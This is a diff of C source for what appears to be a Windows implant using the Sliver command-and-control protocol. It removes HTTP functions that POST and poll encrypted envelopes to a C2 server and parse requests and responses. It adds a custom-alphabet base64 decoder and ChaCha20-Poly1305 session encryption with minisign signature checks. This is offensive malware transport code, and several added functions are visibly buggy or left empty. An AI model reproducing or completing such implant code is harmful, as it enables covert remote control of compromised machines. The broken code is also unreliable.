@@ -252,8 +252,7 @@ PBUFFER MarshalEnvelope
 
 PENVELOPE UnmarshalEnvelope
 (
-	_In_ PBYTE pInput,
-	_In_ DWORD cbInput
+	_In_ PBUFFER pData
 )
 {
 	PPBElement ElementList[4];
@@ -324,213 +323,12 @@ CLEANUP:
 	return;
 }
 
-BOOL WriteEnvelope
-(
-	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
-	_In_ PENVELOPE pEnvelope
-)
-{
-	PBUFFER pMarshalledEnvelope = NULL;
-	DWORD cbCipherText = 0;
-	PBYTE pCipherText = NULL;
-	LPSTR lpEncodedData = NULL;
-	LPSTR lpUri = NULL;
-	PURI pUri = NULL;
-	PHTTP_RESP pResp = NULL;
-	BOOL Result = FALSE;
-
-	if (pEnvelope == NULL) {
-		goto CLEANUP;
-	}
-
-	if (pEnvelope->pData != NULL) {
-		PrintFormatW(L"Write Envelope:\n");
-		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-	}
-	else {
-		PrintFormatW(L"Write Envelope: []\n");
-	}
-
-	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
-	pCipherText = SessionEncrypt(pSliverClient, pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer, &cbCipherText);
-	lpUri = CreateSessionURL(pSliverClient);
-	if (lpUri == NULL) {
-		goto CLEANUP;
-	}
-
-	pUri = UriInit(lpUri);
-	if (pUri == NULL) {
-		goto CLEANUP;
-	}
-
-	lpEncodedData = SliverBase64Encode(pCipherText, cbCipherText);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, "POST", NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
-	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
-		goto CLEANUP;
-	}
-
-	Result = TRUE;
-CLEANUP:
-	if (lpUri != NULL) {
-		FREE(lpUri);
-	}
-
-	if (lpEncodedData != NULL) {
-		FREE(lpEncodedData);
-	}
-
-	if (pCipherText != NULL) {
-		FREE(pCipherText);
-	}
-
-	FreeUri(pUri);
-	FreeBuffer(pMarshalledEnvelope);
-	FreeHttpResp(pResp);
-
-	return Result;
-}
-
 PENVELOPE ReadEnvelope
 (
 	_In_ PSLIVER_HTTP_CLIENT pSliverClient
 )
 {
-	LPSTR lpUri = NULL;
-	PHTTP_RESP pResp = NULL;
-	PURI pUri = NULL;
-	PENVELOPE pResult = NULL;
-	PBYTE pDecodedData = NULL;
-	DWORD cbDecodedData = 0;
-	PBYTE pPlainText = NULL;
-	DWORD cbPlainText = 0;
-
-	lpUri = CreatePollURL(pSliverClient);
-	if (lpUri == NULL) {
-		goto CLEANUP;
-	}
-
-	pUri = UriInit(lpUri);
-	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, pUri->lpPathWithQuery, "GET", NULL, NULL, 0, FALSE, TRUE);
-	if (pResp == NULL) {
-		goto CLEANUP;
-	}
-
-	if (pResp->dwStatusCode == HTTP_STATUS_NO_CONTENT) {
-		goto CLEANUP;
-	}
-
-	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
-		goto CLEANUP;
-	}
-
-	pDecodedData = SliverBase64Decode(pResp->pRespData, &cbDecodedData);
-	pPlainText = SessionDecrypt(pSliverClient, pDecodedData, cbDecodedData, &cbPlainText);
-	pResult = UnmarshalEnvelope(pPlainText, cbPlainText);
-CLEANUP:
-	if (lpUri != NULL) {
-		FREE(lpUri);
-	}
-
-	if (pPlainText != NULL) {
-		FREE(pPlainText);
-	}
-
-	if (pDecodedData != NULL) {
-		FREE(pDecodedData);
-	}
-
-	FreeUri(pUri);
-	FreeHttpResp(pResp);
-	return pResult;
-}
-
-PSLIVER_REQ UnmarshalSliverReq
-(
-	_In_ PBYTE pInput,
-	_In_ DWORD cbInput
-)
-{
-	PPBElement ElementList[4];
-	DWORD i = 0;
-	PSLIVER_REQ pResult = NULL;
-	LPVOID* pTemp = NULL;
-
-	SecureZeroMemory(ElementList, sizeof(PPBElement));
-	for (i = 0; i < _countof(ElementList); i++) {
-		ElementList[i] = ALLOC(sizeof(PBElement));
-	}
-
-	ElementList[0]->dwFieldIdx = 1;
-	ElementList[1]->dwFieldIdx = 2;
-	ElementList[2]->dwFieldIdx = 8;
-	ElementList[3]->dwFieldIdx = 9;
-
-	ElementList[0]->Type = Varint;
-	ElementList[1]->Type = Varint;
-	ElementList[2]->Type = Bytes;
-	ElementList[3]->Type = Bytes;
-
-	pTemp = UnmarshalStruct(ElementList, _countof(ElementList), pInput, cbInput, NULL);
-	pResult = ALLOC(sizeof(SLIVER_REQ));
-	if (pTemp[0] != NULL) {
-		pResult->Async = TRUE;
-	}
-
-	pResult->uTimeout = (UINT64)pTemp[1];
-	if (pTemp[2] != NULL) {
-		memcpy(pResult->szBeaconID, ((PBUFFER)(pTemp[2]))->pBuffer, ((PBUFFER)(pTemp[2]))->cbBuffer);
-	}
-
-	if (pTemp[3] != NULL) {
-		memcpy(pResult->szSessionID, ((PBUFFER)(pTemp[3]))->pBuffer, ((PBUFFER)(pTemp[3]))->cbBuffer);
-	}
-
-	return pResult;
-}
-
-PBUFFER MarshalSliverReq
-(
-	_In_ PSLIVER_REQ pSliverReq
-)
-{
-
-}
-
-PBUFFER MarshalSliverResp
-(
-	_In_ PSLIVER_RESP pSliverResp
-)
-{
-	PPBElement ElementList[4];
-	PPBElement pFinalElement = NULL;
-	PBUFFER pResult = NULL;
 	
-	SecureZeroMemory(ElementList, sizeof(ElementList));
-	if (pSliverResp->lpErrDesc != NULL) {
-		ElementList[0] = CreateBytesElement(pSliverResp->lpErrDesc, lstrlenA(pSliverResp->lpErrDesc), 1);
-	}
-
-	if (pSliverResp->Async) {
-		ElementList[1] = CreateVarIntElement(pSliverResp->Async, 2);
-	}
-
-	if (lstrlenA(pSliverResp->szBeaconID) > 0) {
-		ElementList[2] = CreateBytesElement(pSliverResp->szBeaconID, lstrlenA(pSliverResp->szBeaconID), 8);
-	}
-
-	if (lstrlenA(pSliverResp->szSessionID) > 0) {
-		ElementList[3] = CreateBytesElement(pSliverResp->szSessionID, lstrlenA(pSliverResp->szSessionID), 9);
-	}
-
-	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
-	pResult = ALLOC(sizeof(BUFFER));
-	pResult->cbBuffer = pFinalElement->cbMarshalledData;
-	pResult->pBuffer = pFinalElement->pMarshalledData;
-	pFinalElement->pMarshalledData = NULL;
-	pFinalElement->cbMarshalledData = 0;
-
-	FreeElement(pFinalElement);
-	return pResult;
 }
 
 PENVELOPE CreateErrorRespEnvelope
@@ -560,6 +358,100 @@ PENVELOPE CreateErrorRespEnvelope
 	
 	FreeElement(ElementList[0]);
 	FreeElement(FinalElement);
+
+	return pResult;
+}
+
+PBUFFER SliverBase64Decode
+(
+	_In_ LPSTR lpInput
+)
+{
+	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
+	LPSTR lpTemp = NULL;
+	DWORD cbInput = lstrlenA(lpInput);
+	DWORD i = 0;
+	lpTemp = ALLOC(cbInput + 1);
+	DWORD dwPos = 0;
+	PBUFFER pResult = NULL;
+
+	for (i = 0; i < cbInput; i++) {
+		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
+		lpTemp[i] = szOldCharSet[dwPos];
+	}
+
+	pResult = ALLOC(sizeof(BUFFER));
+	pResult->pBuffer = Base64Decode(lpTemp, &pResult->cbBuffer);
+	FREE(lpTemp);
+	return pResult;
+}
+
+PBUFFER SliverEncrypt
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ PBUFFER pInput
+)
+{
+	PBYTE pNonce = NULL;
+	PBUFFER pResult = NULL;
+
+	pNonce = GenRandomBytes(CHACHA20_NONCE_SIZE);
+	pResult = ALLOC(sizeof(BUFFER));
+	Chacha20Poly1305Encrypt(pConfig->pSessionKey, pNonce, pInput->pBuffer, pInput->cbBuffer, NULL, 0, &pResult->pBuffer, &pResult->cbBuffer);
+	pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + CHACHA20_NONCE_SIZE);
+	memcpy(pResult->pBuffer + CHACHA20_NONCE_SIZE, pResult->pBuffer, pResult->cbBuffer);
+	memcpy(pResult->pBuffer, pNonce, CHACHA20_NONCE_SIZE);
+	pResult->cbBuffer += CHACHA20_NONCE_SIZE;
+	if (pNonce != NULL) {
+		FREE(pNonce);
+	}
+
+	return pResult;
+}
+
+PBUFFER SliverDecrypt
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ PBUFFER pCipherText
+)
+{
+	PBUFFER pResult = NULL;
+	PMINISIGN_PUB_KEY pDecodedPubKey = NULL;
+	PBYTE pTemp = NULL;
+	PBYTE pNonce = NULL;
+	DWORD cbCipherText = 0;
+	DWORD cbPlainText = 0;
+
+	if (pCipherText->cbBuffer < MINISIGN_SIZE + 1) {
+		goto CLEANUP;
+	}
+
+	pDecodedPubKey = DecodeMinisignPublicKey(pConfig->lpServerMinisignPublicKey);
+	if (pDecodedPubKey == NULL) {
+		goto CLEANUP;
+	}
+
+	pTemp = pCipherText->pBuffer;
+	if (!VerifySign(pDecodedPubKey, pTemp, pCipherText->cbBuffer, FALSE)) {
+		goto CLEANUP;
+	}
+
+	pNonce = pTemp + MINISIGN_SIZE;
+	pTemp = pNonce + CHACHA20_NONCE_SIZE;
+	cbCipherText = pCipherText->cbBuffer - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
+	pResult = ALLOC(sizeof(BUFFER));
+	pResult->pBuffer = ALLOC(cbCipherText);
+	pResult = Chacha20Poly1305DecryptAndVerify(pConfig->pSessionKey, pNonce, pTemp, cbCipherText, NULL, 0, &cbPlainText);
+	if (pResult == NULL || cbPlainText == 0) {
+		goto CLEANUP;
+	}
+
+	pResult->cbBuffer = cbPlainText;
+CLEANUP:
+	if (pDecodedPubKey != NULL) {
+		FREE(pDecodedPubKey);
+	}
 
 	return pResult;
 }
